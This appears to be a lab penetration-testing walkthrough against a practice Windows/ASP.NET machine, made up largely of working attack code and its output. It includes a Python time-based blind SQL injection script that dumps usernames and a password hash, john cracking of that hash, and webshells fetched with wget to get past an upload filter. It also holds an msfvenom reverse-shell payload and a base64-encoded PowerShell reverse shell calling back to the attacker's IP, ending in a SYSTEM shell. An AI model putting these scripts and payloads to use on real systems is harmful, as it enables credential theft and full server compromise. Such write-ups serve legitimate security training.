[21:38:57] [INFO] using PowerShell to write the binary file content to file 'C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Log\tmpseellk.exe'
[21:39:00] [INFO] retrieved: 
[21:39:01] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[21:39:01] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
do you want to try to upload the file with the custom Visual Basic script technique? [Y/n] 
[21:39:06] [INFO] using a custom visual basic script to write the binary file content to file 'C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Log\tmpseellk.exe', please wait..                                                                                                                                                 
[21:39:10] [INFO] retrieved: 
[21:39:10] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
do you want to try to upload the file with the built-in debug.exe technique? [Y/n] 
[21:39:12] [INFO] using debug.exe to write the binary file content to file 'C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Log\tmpseellk.exe', please wait..
[21:39:31] [INFO] retrieved: 
[21:39:32] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
do you want to try to upload the file with the built-in certutil.exe technique? [Y/n] 
[21:39:41] [INFO] using certutil.exe to write the binary file content to file 'C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Log\tmpseellk.exe', please wait..
[21:39:45] [INFO] retrieved: 
[21:39:46] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[21:39:46] [ERROR] there has been a problem uploading shellcodeexec. It looks like the binary file has not been written on the database underlying file system or an AV has flagged it as malicious and removed it
[21:39:46] [ERROR] unable to mount the operating system takeover, skipping to the next form
[21:39:46] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-02142022_0937pm.csv'
[21:39:46] [WARNING] your sqlmap version is outdated

[*] ending @ 21:39:46 /2022-02-14/

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## Dump Database

`SELECT name FROM master..sysdatabases;`

```
admin'; IF([INFERENCE]) WAITFOR DELAY '0:0:5'; --
```

## Error based SQL Injection

![](Pasted%20image%2020220215111807.png)

```html
 <td colspan=2 style="padding-top: 20px;"><center><span id="ContentPlaceHolder1_MyLabel" class="error">System.Data.SqlClient.SqlException (0x80131904): Invalid column name 'a'.
   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction)
   at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose)
   at System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady)
   at System.Data.SqlClient.SqlDataReader.TryConsumeMetaData()
   at System.Data.SqlClient.SqlDataReader.get_MetaData()
   at System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString, Boolean isInternal, Boolean forDescribeParameterEncryption, Boolean shouldCacheForAlwaysEncrypted)
   at System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async, Int32 timeout, Task& task, Boolean asyncWrite, Boolean inRetry, SqlDataReader ds, Boolean describeParameterEncryptionRequest)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, TaskCompletionSource`1 completion, Int32 timeout, Task& task, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteReader()
   at MyNamespaceMain.MyClassMain.Login(Object sender, EventArgs e)
ClientConnectionId:a8717de9-661d-4ce3-ae83-d5a31859601c
Error Number:207,State:1,Class:16</span></center></td> </tr> </table>
```

## Time based

`'; IF LEN(@@version) >5 WAITFOR DELAY '00:00:15'; --`

Basic Template

```python
#!/usr/bin/python3
# https://github.com/timip/exploit/blob/master/timeclock.py


import requests, string, sys
 
payload = lambda x: "__VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox="+x+"&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter"
payload = lambda x: {
    "__VIEWSTATE":"/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=",
    "__VIEWSTATEGENERATOR":"CA0B0334",
    "__EVENTVALIDATION":"/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=",
    "ctl00$ContentPlaceHolder1$UsernameTextBox":x,
    "ctl00$ContentPlaceHolder1$PasswordTextBox":"", 
    "ctl00$ContentPlaceHolder1$LoginButton":"Enter"}
query = lambda pos, char: f"'; IF LOWER(SUBSTRING('test',{pos},1))='{char}' WAITFOR DELAY '00:00:15'; --"

chars = string.ascii_letters + '0123456789'

host = sys.argv[1]
port = sys.argv[2]
 
print("Running!")

for i in range(1, 100):
    found = False
    for c in chars:
        try:
            r = requests.post("http://" + host + ":" + port + "/",data=payload(query(i,c)), timeout=5)
            #print(r.text);exit()
        except requests.exceptions.Timeout:
            sys.stdout.write(c)
            sys.stdout.flush()
            found = True
            break
    if not found:
        break
 
print("\nDone! Try Harder!")
```

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                            1 ⚙
Running!
test
Done! Try Harder!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```


`query = lambda pos, char: f"'; IF LOWER(SUBSTRING((SELECT TOP 1 TABLE_NAME FROM information_schema.TABLES),{pos},1))='{char}' WAITFOR DELAY '00:00:15'; --"`
```
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                            1 ⚙
Running!
users
Done! Try Harder!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

`query = lambda pos, char: f"'; IF LOWER(SUBSTRING((SELECT TOP 1 COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users'),{pos},1))='{char}' WAITFOR DELAY '00:00:15'; --"`
```bash
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                            1 ⚙
Running!
user
Done! Try Harder!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```


```python
query = lambda pos, char: f"'; IF LOWER(SUBSTRING(SELECT COLUMN_NAME FROM (SELECT ROW_NUMBER() OVER (ORDER BY COLUMN_NAME) AS row_num, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users') WHERE row_num=2),{pos},1))='{char}' WAITFOR DELAY '00:00:15'; --"
```

### Column Enumeration

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                            1 ⚙
'; IF LOWER(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.COLUMNS ORDER BY COLUMN_NAME OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:4'; --
Running!
user
Done! Try Harder!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                            1 ⚙
'; IF LOWER(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.COLUMNS ORDER BY COLUMN_NAME OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:4'; --
Running!
username
Done! Try Harder!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$   
```

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                            1 ⚙
'; IF LOWER(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY COLUMN_NAME OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:4'; --
Running!
password
Done! Try Harder!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                            1 ⚙
'; IF LOWER(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY COLUMN_NAME OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:4'; --
Running!
user
Done! Try Harder!
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$       
```


Code
```python
#!/usr/bin/python3
# https://github.com/timip/exploit/blob/master/timeclock.py


import requests, string, sys
 
payload = lambda x: "__VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox="+x+"&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter"
payload = lambda x: {
    "__VIEWSTATE":"/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=",
    "__VIEWSTATEGENERATOR":"CA0B0334",
    "__EVENTVALIDATION":"/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=",
    "ctl00$ContentPlaceHolder1$UsernameTextBox":x,
    "ctl00$ContentPlaceHolder1$PasswordTextBox":"", 
    "ctl00$ContentPlaceHolder1$LoginButton":"Enter"}
query = lambda pos, char, entry: f"'; IF LOWER(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY COLUMN_NAME OFFSET {entry} ROWS FETCH NEXT 1 ROWS ONLY),{pos},1))='{char}' WAITFOR DELAY '00:00:3'; --"
print(query(1, 1, 1))
chars = string.ascii_letters + '0123456789'

host = sys.argv[1]
port = sys.argv[2]
 
print("Running!")

for e in range(1,100):
    for i in range(1, 100):
        found = False
        for c in chars:
            try:
                r = requests.post("http://" + host + ":" + port + "/",data=payload(query(i,c,e)), timeout=3)
                #print(r.text);exit()
                if e==1 and c == chars[-1] and i==1:
                    print(r.text)
                    exit()
            except requests.exceptions.Timeout:
                sys.stdout.write(c)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    sys.stdout.write('\n')
 
print("\nDone! Try Harder!")
```
### Database Enum

List of tables
```
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                      130 ⨯ 1 ⚙
'; IF LOWER(SUBSTRING((SELECT COL FROM TABLE WHERE CONDITION ORDER BY COL OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:3'; --
Running!
users
t


```

Code
https://www.geeksforgeeks.org/sql-offset-fetch-clause/
```python
#!/usr/bin/python3
# https://github.com/timip/exploit/blob/master/timeclock.py


import requests, string, sys
 
payload = lambda x: "__VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox="+x+"&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter"
payload = lambda x: {
    "__VIEWSTATE":"/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=",
    "__VIEWSTATEGENERATOR":"CA0B0334",
    "__EVENTVALIDATION":"/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=",
    "ctl00$ContentPlaceHolder1$UsernameTextBox":x,
    "ctl00$ContentPlaceHolder1$PasswordTextBox":"", 
    "ctl00$ContentPlaceHolder1$LoginButton":"Enter"}
q = lambda pos, char, entry,col,table,condition: f"'; IF LOWER(SUBSTRING((SELECT {col} FROM {table} WHERE {condition} ORDER BY {col} OFFSET {entry} ROWS FETCH NEXT 1 ROWS ONLY),{pos},1))='{char}' WAITFOR DELAY '00:00:3'; --"
query = lambda pos,char,entry: q(pos,char,entry,"COLUMN_NAME","information_schema.COLUMNS","TABLE_NAME='users'") #"COL", "TABLE", "CONDITION")
print(query(1, 1, 1))
chars = string.ascii_letters + '0123456789'

host = sys.argv[1]
port = sys.argv[2]
 
print("Running!")

for e in range(0,100):
    for i in range(1, 100):
        found = False
        for c in chars:
            try:
                r = requests.post("http://" + host + ":" + port + "/",data=payload(query(i,c,e)), timeout=3)
                #print(r.text);exit()
                if e==1 and c == chars[-1] and i==1:
                    print(r.text)
                    exit()
            except requests.exceptions.Timeout:
                sys.stdout.write(c)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    sys.stdout.write('\n')
 
print("\nDone! Try Harder!")
```

column enum
```
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                            1 ⚙
'; IF LOWER(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY COLUMN_NAME OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:3'; --
Running!
password
userAid
username





```

users enumeration
```bash
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                      130 ⨯ 1 ⚙
'; IF LOWER(SUBSTRING((SELECT username FROM users WHERE 1=1 ORDER BY username OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:3'; --
Running!
butch

...
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                            1 ⚙
'; IF LOWER(SUBSTRING((SELECT user FROM users WHERE 1=1 ORDER BY username OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:3'; --
Running!
butch
z
YxL^C
...

```

password enumeration


### Forgot to include punctionation chars

```python
#!/usr/bin/python3
# https://github.com/timip/exploit/blob/master/timeclock.py


import requests, string, sys
 
delay = 5
payload = lambda x: "__VIEWSTATE=/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=&ctl00$ContentPlaceHolder1$UsernameTextBox="+x+"&ctl00$ContentPlaceHolder1$PasswordTextBox=&ctl00$ContentPlaceHolder1$LoginButton=Enter"
payload = lambda x: {
    "__VIEWSTATE":"/wEPDwUKLTQ0NDEwMDQ5MmRksS3kT9xVa5WcaOExJczybgwm5ag61c1aSJauWk+MueM=",
    "__VIEWSTATEGENERATOR":"CA0B0334",
    "__EVENTVALIDATION":"/wEdAAQlk/dmKT4Sorxxd/xByuYXG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6cSWj1jCV5XpbYX8jTlKxWkDqoWst7QvUmEJo+jB/FoQ=",
    "ctl00$ContentPlaceHolder1$UsernameTextBox":x,
    "ctl00$ContentPlaceHolder1$PasswordTextBox":"", 
    "ctl00$ContentPlaceHolder1$LoginButton":"Enter"}
q = lambda pos, char, entry,col,table,ordercol,condition: f"'; IF LOWER(SUBSTRING((SELECT {col} FROM {table} WHERE {condition} ORDER BY {ordercol} OFFSET {entry} ROWS FETCH NEXT 1 ROWS ONLY),{pos},1))='{char}' WAITFOR DELAY '00:00:{delay}'; --"

# Tables
#query = lambda pos,char,entry: q(pos,char,entry,"TABLE_NAME","information_schema.TABLES","TABLE_NAME", "1=1") #"COL", "TABLE", "CONDITION")
# Columns
query = lambda pos,char,entry: q(pos,char,entry,"COLUMN_NAME","information_schema.COLUMNS","COLUMN_NAME", "TABLE_NAME='users'") #"COL", "TABLE", "CONDITION")
# Usernames
#query = lambda pos,char,entry: q(pos,char,entry,"password_hash","users","username", "1=1") #"COL", "TABLE", "CONDITION")


print(query(1, 1, 1))
chars = string.ascii_letters + '0123456789' + string.punctuation

host = sys.argv[1]
port = sys.argv[2]
 
print("Running!")

for e in range(0,100):
    for i in range(1, 100):
        found = False
        for c in chars:
            try:
                r = requests.post("http://" + host + ":" + port + "/",data=payload(query(i,c,e)), timeout=delay)
                #print(r.text);exit()
                if e==0 and c == chars[-1] and i==1:
                    print(r.text)
                    exit()
            except requests.exceptions.Timeout:
                sys.stdout.write(c)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    sys.stdout.write('\n')
 
print("\nDone! Try Harder!")
```

```bash
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                            1 ⚙
'; IF LOWER(SUBSTRING((SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users' ORDER BY COLUMN_NAME OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:5'; --
Running!
password_hash
user_id
username


^C
...
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                      130 ⨯ 1 ⚙
'; IF LOWER(SUBSTRING((SELECT password_hash FROM users WHERE 1=1 ORDER BY username OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:5'; --
Running!
e7b2b06dd8acded117d6d0756732c4c4ecdc75a788e09e81bffd84f11af6d267



^C
```

![](Pasted%20image%2020220215161051.png)

### Getting hash

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 exploit.py 192.168.70.63 450                                                                                                                      130 ⨯ 1 ⚙
'; IF LOWER(SUBSTRING((SELECT password_hash FROM users WHERE 1=1 ORDER BY username OFFSET 1 ROWS FETCH NEXT 1 ROWS ONLY),1,1))='1' WAITFOR DELAY '00:00:5'; --
Running!
e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267
L



```

```
┌──(kali㉿kali)-[/tmp]
└─$ echo 'e7b2b06dd8acded117d6d075673274c4ecdc75a788e09e81bffd84f11af6d267' > hash                                                                                130 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "gost", but the string is also recognized as "HAVAL-256-3"
Use the "--format=HAVAL-256-3" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "Panama"
Use the "--format=Panama" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "po"
Use the "--format=po" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "Raw-Keccak-256"
Use the "--format=Raw-Keccak-256" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "Raw-SHA256"
Use the "--format=Raw-SHA256" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "skein-256"
Use the "--format=skein-256" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "Snefru-256"
Use the "--format=Snefru-256" option to force loading these as that type instead
Warning: detected hash type "gost", but the string is also recognized as "Stribog-256"
Use the "--format=Stribog-256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:04 2.56% (ETA: 03:54:53) 0g/s 94663p/s 94663c/s 94663C/s colts29..cl12345
Session aborted
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt  --format=Raw-SHA256                                                                                      1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
awesomedude      (?)
1g 0:00:00:00 DONE (2022-02-15 03:52) 4.545g/s 2532Kp/s 2532Kc/s 2532KC/s chaddy12..131700
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## logging in

with credentials `butch`:`awesomedude`

![](Pasted%20image%2020220215160812.png)
![](Pasted%20image%2020220215160912.png)

Uploaded an image

![](Pasted%20image%2020220215160957.png)

## File Upload Vuln
### Uploading aspx test

```
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.70 LPORT=450  EXITFUNC=thread -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2736 bytes
Saved as: shell.aspx
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

![](Pasted%20image%2020220215161436.png)
### Upload File

```
┌──(kali㉿kali)-[/tmp]
└─$ cp /home/kali/Pictures/Screenshot_2021-04-01_06_27_16.png a.png                                                                                                 1 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ (cat a.png && cat shell.aspx ) > thing.png.aspx                
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo nc -nlvp 450                                                          
listening on [any] 450 ...
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ cp thing.png.aspx other.aspx.png                                                                                                                                1 ⨯
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

![](Pasted%20image%2020220215161756.png)
![](Pasted%20image%2020220215161920.png)

### Testing Different file name
https://book.hacktricks.xyz/pentesting-web/file-upload

![](Pasted%20image%2020220215162657.png)

![](Pasted%20image%2020220215162638.png)
![](Pasted%20image%2020220215163331.png)
![](Pasted%20image%2020220215163418.png)

### Testing Payload

https://github.com/tennc/webshell/blob/master/caidao-shell/customize.asmx
```
┌──(kali㉿kali)-[/tmp]
└─$ wget https://raw.githubusercontent.com/tennc/webshell/master/caidao-shell/customize.asmx
--2022-02-15 03:40:00--  https://raw.githubusercontent.com/tennc/webshell/master/caidao-shell/customize.asmx
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14065 (14K) [text/plain]
Saving to: ‘customize.asmx’

customize.asmx                            100%[=====================================================================================>]  13.74K  --.-KB/s    in 0.002s  

2022-02-15 03:40:00 (7.01 MB/s) - ‘customize.asmx’ saved [14065/14065]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

![](Pasted%20image%2020220215164207.png)

https://raw.githubusercontent.com/niemand-sec/RazorSyntaxWebshell/master/webshell.cshtml

![](Pasted%20image%2020220215165544.png)

## Webshell

https://buaq.net/go-1190.html

```
┌──(kali㉿kali)-[/tmp]
└─$ wget https://raw.githubusercontent.com/xl7dev/WebShell/master/Ashx/shell.jpg                 
--2022-02-15 04:09:50--  https://raw.githubusercontent.com/xl7dev/WebShell/master/Ashx/shell.jpg
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1446 (1.4K) [text/plain]
Saving to: ‘shell.jpg’

shell.jpg                                 100%[=====================================================================================>]   1.41K  --.-KB/s    in 0s      

2022-02-15 04:09:51 (22.4 MB/s) - ‘shell.jpg’ saved [1446/1446]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ mv shell.jpg webshell.ashx
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

![](Pasted%20image%2020220215171052.png)

![](Pasted%20image%2020220215171124.png)

![](Pasted%20image%2020220215171209.png)

![](Pasted%20image%2020220215171236.png)

## Reverse Shell

Payload Generated from https://www.revshells.com/
```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADcAMAAiACwANAA1ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```


```
┌──(kali㉿kali)-[/tmp]
└─$ sudo nc -nlvp 450                                                                                                                                             127 ⨯
[sudo] password for kali: 
listening on [any] 450 ...
connect to [192.168.49.70] from (UNKNOWN) [192.168.70.63] 49811
whoami
nt authority\system
PS C:\windows\system32\inetsrv> cd \Users\Administrator
PS C:\Users\Administrator> cd Desktop
PS C:\Users\Administrator\Desktop> type proof.txt
38a84676bffecc6932d31c82771daccd
PS C:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::746e:6f6f:186a:5bf6%6
   IPv4 Address. . . . . . . . . . . : 192.168.70.63
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.70.254
PS C:\Users\Administrator\Desktop> 
```

